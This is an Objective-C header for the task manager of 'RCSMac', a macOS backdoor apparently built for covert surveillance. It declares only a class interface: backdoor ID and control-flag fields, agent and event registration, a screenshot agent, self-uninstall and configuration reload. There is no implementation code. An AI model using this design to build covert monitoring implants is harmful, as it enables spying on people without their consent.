/*
 * RCSMac - Task Manager
 *  This class will be responsible for managing all the operations within
 *  Events/Actions/Agents, thus the Core will have to deal with them in the
 *  most generic way.
 * 
 *
 * Created by Alfredo 'revenge' Pesoli on 10/04/2009
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

#import <Cocoa/Cocoa.h>

#ifndef __RCSMTaskManager_h__
#define __RCSMTaskManager_h__

@class __m_MConfManager;
@class __m_MEvents;
@class __m_MActions;
@class __m_MAgentScreenshot;
@class __m_MSharedMemory;
@class __m_MLogManager;

//
// This class is a singleton
//
@interface __m_MTaskManager : NSObject
{
  BOOL mIsSyncing;
  
  NSMutableArray *mEventsList;
  NSMutableArray *mActionsList;
  NSMutableArray *mAgentsList;

@private
  int mBackdoorID;
  NSString *mBackdoorControlFlag;
  BOOL mShouldReloadConfiguration;
  
@private
  __m_MConfManager   *mConfigManager;
  __m_MActions       *mActions;
}

//@property (readonly, retain) NSMutableArray *mEventsList;
//@property (readonly, retain) NSMutableArray *mActionsList;
//@property (readonly, retain) NSMutableArray *mAgentsList;
@property (readwrite)        int mBackdoorID;
@property (readwrite, copy)  NSString *mBackdoorControlFlag;
@property (readwrite)        BOOL mShouldReloadConfiguration;
@property (readonly)         BOOL mIsSyncing;
@property (readonly)  NSMutableArray *mEventsList;
@property (readonly)  NSMutableArray *mActionsList;
@property (readonly)  NSMutableArray *mAgentsList;

+ (__m_MTaskManager *)sharedInstance;
+ (id)allocWithZone: (NSZone *)aZone;
- (id)copyWithZone: (NSZone *)aZone;
- (id)init;
- (id)retain;
- (unsigned)retainCount;
- (void)release;
- (id)autorelease;

- (void)uninstallMeh;

- (BOOL)loadInitialConfiguration;
- (BOOL)updateConfiguration: (NSMutableData *)aConfigurationData;
- (BOOL)reloadConfiguration;

- (id)initAgent: (u_int)agentID;

- (BOOL)startAgents;
- (BOOL)stopAgents;

- (BOOL)startAgent: (u_int)agentID;
- (BOOL)restartAgent: (u_int)agentID;
- (BOOL)suspendAgent: (u_int)agentID;
- (BOOL)stopAgent: (u_int)agentID;

- (BOOL)suspendAgents;
- (BOOL)restartAgents;

- (void)eventsMonitor;
- (BOOL)stopEvents;

- (BOOL)triggerAction: (int)anActionID;

- (BOOL)unregisterAgent: (u_int)agentID;

- (BOOL)registerAgent: (NSData *)agentData
              agentID: (u_int)agentID
               status: (u_int)status;
- (BOOL)registerEvent: (NSData *)eventData
                 type: (u_int)aType
               action: (u_int)actionID;
- (BOOL)unregisterEvent: (u_int)eventID;
- (BOOL)registerAction: (NSData *)actionData
                  type: (u_int)actionType
                action: (u_int)actionID;
- (BOOL)unregisterAction: (u_int)actionID;


- (NSArray *)eventsList;
- (NSArray *)actionsList;
- (NSArray *)agentsList;

//- (NSMutableDictionary *)getEvent: (u_int)anEventType;
- (NSMutableDictionary *)getConfigForAgent:  (u_int)anAgentID;
- (NSArray *)getConfigForAction: (u_int)anActionID;

- (BOOL)shouldMigrateConfiguration: (NSString*)migrationConfiguration;

- (NSString *)getControlFlag;

- (void)removeAllElements;

@end

#endif
